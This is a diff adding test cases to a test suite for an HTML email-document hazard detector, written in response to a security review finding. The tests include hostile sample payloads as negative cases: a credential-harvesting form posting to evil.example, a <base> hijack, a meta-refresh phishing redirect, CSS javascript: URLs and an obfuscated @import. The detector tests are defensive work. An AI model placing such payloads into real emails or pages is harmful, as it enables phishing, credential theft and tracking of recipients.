@@ -32,6 +32,54 @@ describe("findHtmlDocHazard — adversarial patterns", () => {
       findHtmlDocHazard('<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==">'),
     ).toBeNull();
   });
+
+  // ── Adversarial-review finding #5 (2026-07-30, HIGH): the write-time
+  // backstop only covered 9 patterns and missed a whole class the real
+  // sanitizer already handles — a direct `updateCampaignDoc` call (compose-
+  // gated, but callable from devtools/a script, and what autosave itself
+  // uses) could land a credential-harvesting form, a tracking <link>, a
+  // <base> hijack, an open-redirect <meta refresh>, or obfuscated CSS
+  // verbatim into a send. These are the exact NEGATIVE-space payloads the
+  // finding named that the OLD 9-pattern list did not catch. ──────────────
+  describe("finding #5 — expanded hazard coverage", () => {
+    test.each([
+      ['<form action="https://evil.example/steal"><input name="pw"></form>', "a <form> tag"],
+      ['<link rel="stylesheet" href="https://evil.example/x.css">', "a <link> tag"],
+      ['<base href="https://evil.example/">', "a <base> tag"],
+      [
+        '<meta http-equiv="refresh" content="0;url=https://evil/phish">',
+        "a <meta http-equiv> tag",
+      ],
+      // The exact case-insensitive/attribute-order variants a naive check
+      // could still miss.
+      ['<META HTTP-EQUIV="Refresh" CONTENT="0;url=https://evil/phish">', "a <meta http-equiv> tag"],
+      ['<meta content="0;url=https://evil/phish" http-equiv="refresh">', "a <meta http-equiv> tag"],
+    ])("flags %s", (html, expected) => {
+      expect(findHtmlDocHazard(html)).toBe(expected);
+    });
+
+    test("[exact payload] catches CSS url(javascript:...) inside a style attribute", () => {
+      const hazard = findHtmlDocHazard('<div style="background:url(javascript:alert(1))">x</div>');
+      expect(hazard).not.toBeNull();
+    });
+
+    test("[exact payload] catches @import obfuscated behind a CSS hex escape", () => {
+      const hazard = findHtmlDocHazard("<style>@\\69 mport url(https://evil/x.css)</style>");
+      expect(hazard).not.toBeNull();
+    });
+
+    test("catches a protocol-relative CSS url() reference (never a legitimate output of the import pipeline)", () => {
+      const hazard = findHtmlDocHazard('<div style="background:url(//evil.example/track.gif)">x</div>');
+      expect(hazard).not.toBeNull();
+    });
+
+    test("a legitimately-imported doc (charset/color-scheme meta, no http-equiv, real re-hosted https images) stays clean", () => {
+      const html =
+        '<html><head><meta charset="utf-8"><meta name="color-scheme" content="light dark"></head>' +
+        '<body><table><tr><td style="padding:16px;color:#111"><img src="https://storage.convex.example/rehosted-1.png" alt="Hi"></td></tr></table></body></html>';
+      expect(findHtmlDocHazard(html)).toBeNull();
+    });
+  });
 });
 
 describe("validateEmailHtmlDocument", () => {
